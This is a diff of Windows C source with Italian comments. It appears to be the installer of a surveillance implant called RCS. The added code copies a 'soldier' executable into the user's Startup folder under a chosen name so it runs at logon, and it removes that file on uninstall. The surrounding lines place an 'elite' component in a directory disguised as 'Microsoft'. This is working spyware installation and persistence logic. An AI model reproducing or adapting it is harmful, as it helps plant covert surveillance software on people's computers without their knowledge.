@@ -1,5 +1,6 @@
 #include "stdafx.h"
 #include "Functions_Users.h"
+#include "Functions_RCS.h"
 #include "commons.h"
 
 BOOL WIN_RCSInstall(rcs_struct_t *rcs_info, users_struct_t *user_info, os_struct_t *os_info)
@@ -8,6 +9,15 @@ BOOL WIN_RCSInstall(rcs_struct_t *rcs_info, users_struct_t *user_info, os_struct
 	WCHAR tmp_path2[MAX_PATH*2];
 	HANDLE hFind;
 	WIN32_FIND_DATA file_info;
+
+	// Se puo' installare solo il soldier
+	if (os_info->is_blacklisted == BL_ALLOWSOLDIER) {
+		swprintf_s(tmp_path, MAX_PATH, L"%s\\WINDOWS\\SOLDIER\\soldier", rcs_info->rcs_files_path);
+		swprintf_s(tmp_path2, MAX_PATH, L"%s\\%s.exe", user_info->user_startup, rcs_info->soldier_name);
+		return CopyFile(tmp_path, tmp_path2, FALSE);
+	}
+
+	// Continua se deve installare l'elite...
 
 	// Crea la directory nuova
 	swprintf_s(tmp_path, MAX_PATH, L"%s%s\\Microsoft", user_info->user_home, user_info->user_local_settings);
@@ -67,6 +77,12 @@ BOOL WIN_RCSUnInstall(rcs_struct_t *rcs_info, users_struct_t *user_info, os_stru
 	WIN32_FIND_DATA file_info;
 	BOOL ret_val = TRUE;
 	HRESULT reg_ret1, reg_ret2, reg_ret3;
+
+	// Cancella un eventuale Soldier
+	swprintf_s(tmp_path, MAX_PATH, L"%s\\%s.exe", user_info->user_startup, rcs_info->soldier_name);
+	ClearAttributes(tmp_path);
+	if (DeleteFile(tmp_path))
+		return TRUE;
 
 	// Cancella tutti i file (nuova e vecchia directory)
 	swprintf_s(tmp_path, MAX_PATH, L"%s%s\\Microsoft\\%s\\*.*", user_info->user_home, user_info->user_local_settings, rcs_info->new_hdir);
